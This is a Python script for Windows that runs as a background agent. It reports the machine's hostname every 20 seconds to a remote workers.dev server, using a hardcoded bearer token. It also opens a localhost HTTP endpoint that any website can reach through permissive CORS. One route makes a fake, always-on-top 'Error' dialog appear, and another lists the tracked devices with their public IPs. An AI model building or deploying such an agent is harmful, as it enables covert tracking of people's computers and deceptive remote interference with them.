import ctypes
import json
import os
import socket
import subprocess
import tempfile
import threading
import time
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = 5005

# Token de autenticación compartido con el servidor central
AGENT_TOKEN = "ed81f9a6ad3fe1ba5587430863c983c2ea2c77239a158fa7"
LOG_AUTH_URL = "https://telelluc-log-auth.mrocadlectric.workers.dev"
HEARTBEAT_INTERVAL_SECONDS = 20

# ---------------------------------------------------------------------------
# RUTINAS DE NOTIFICACIÓN Y COMPONENTES DE INTERFAZ
# ---------------------------------------------------------------------------
ERROR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_error.vbs")
ACTIVATOR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_activator.vbs")

ERROR_VBS_CONTENT = 'MsgBox "Error", 16 + 65536 + 4096, "Error"\n'
ACTIVATOR_VBS_CONTENT = (
    'Set shell = CreateObject("WScript.Shell")\n'
    "For i = 1 To 25\n"
    "    WScript.Sleep 200\n"
    "Next\n"
)

with open(ERROR_VBS_PATH, "w") as f:
    f.write(ERROR_VBS_CONTENT)

with open(ACTIVATOR_VBS_PATH, "w") as f:
    f.write(ACTIVATOR_VBS_CONTENT)

user32 = ctypes.windll.user32
HWND_TOPMOST = -1
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_SHOWWINDOW = 0x0040


def _find_error_window():
    result = []

    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
    def _enum(hwnd, _lparam):
        if user32.IsWindowVisible(hwnd):
            buf = ctypes.create_unicode_buffer(256)
            user32.GetWindowTextW(hwnd, buf, 256)
            if buf.value.strip() == "Error":
                result.append(hwnd)
                return False
        return True

    user32.EnumWindows(_enum, 0)
    return result[0] if result else None


def _force_topmost():
    for _ in range(60):
        hwnd = _find_error_window()
        if hwnd:
            for _ in range(10):
                user32.SetWindowPos(
                    hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
                )
                time.sleep(0.2)
            return
        time.sleep(0.05)


def show_error():
    subprocess.Popen(["wscript.exe", ERROR_VBS_PATH])
    subprocess.Popen(["wscript.exe", ACTIVATOR_VBS_PATH])
    _force_topmost()


# ---------------------------------------------------------------------------
# FUNCIONES DE COMUNICACIÓN CON EL SERVIDOR CENTRAL
# ---------------------------------------------------------------------------
def heartbeat_loop():
    """Envia de forma periodica el nombre de host para registrar la conexion."""
    hostname = socket.gethostname()
    payload = json.dumps({"hostname": hostname}).encode("utf-8")
    while True:
        try:
            req = urllib.request.Request(
                LOG_AUTH_URL + "/heartbeat",
                data=payload,
                headers={
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + AGENT_TOKEN,
                },
                method="POST",
            )
            urllib.request.urlopen(req, timeout=10).read()
        except Exception:
            pass
        time.sleep(HEARTBEAT_INTERVAL_SECONDS)


def cmd_devices():
    """
    Consulta al backend la lista de dispositivos registrados, obteniendo
    el ID incremental asignado, el nombre del equipo y la IP publica detectada.
    """
    try:
        req = urllib.request.Request(
            LOG_AUTH_URL + "/devices",
            headers={
                "Authorization": "Bearer " + AGENT_TOKEN,
            },
            method="GET",
        )
        with urllib.request.urlopen(req, timeout=10) as response:
            if response.status == 200:
                data = json.loads(response.read().decode("utf-8"))
                devices = data.get("devices", [])
                
                # Renderizado de la tabla en la consola local
                print(f"\n{'ID':<6} | {'Nombre del Dispositivo':<25} | {'IP Pública':<15}")
                print("-" * 55)
                for dev in devices:
                    dev_id = dev.get("id", "N/A")
                    hostname = dev.get("hostname", "Unknown")
                    public_ip = dev.get("public_ip", "0.0.0.0")
                    print(f"{dev_id:<6} | {hostname:<25} | {public_ip:<15}")
                print()
            else:
                print(f"[-] Error en el servidor central: Código {response.status}")
    except Exception as e:
        print(f"[-] Error al conectar con el servicio de inventario: {e}")


# ---------------------------------------------------------------------------
# SERVIDOR HTTP LOCAL (ENDPOINT CONTROL)
# ---------------------------------------------------------------------------
class Handler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Private-Network", "true")

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_GET(self):
        if self.path == "/crash":
            threading.Thread(target=show_error, daemon=True).start()
            self.send_response(200)
        elif self.path == "/devices":
            # Permite activar la consulta de dispositivos mediante una llamada HTTP local
            threading.Thread(target=cmd_devices, daemon=True).start()
            self.send_response(200)
        else:
            self.send_response(404)
        self._cors()
        self.end_headers()

    def log_message(self, format, *args):
        # Deshabilita los logs por defecto en la consola para mantenerla limpia
        pass


if __name__ == "__main__":
    # Inicia el bucle de latidos en segundo plano
    threading.Thread(target=heartbeat_loop, daemon=True).start()

    # Inicia el servidor local de escucha
    server = HTTPServer(("127.0.0.1", PORT), Handler)
    print(f"Servidor de control activo en http://127.0.0.1:{PORT} ...", flush=True)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nCerrando el agente local.")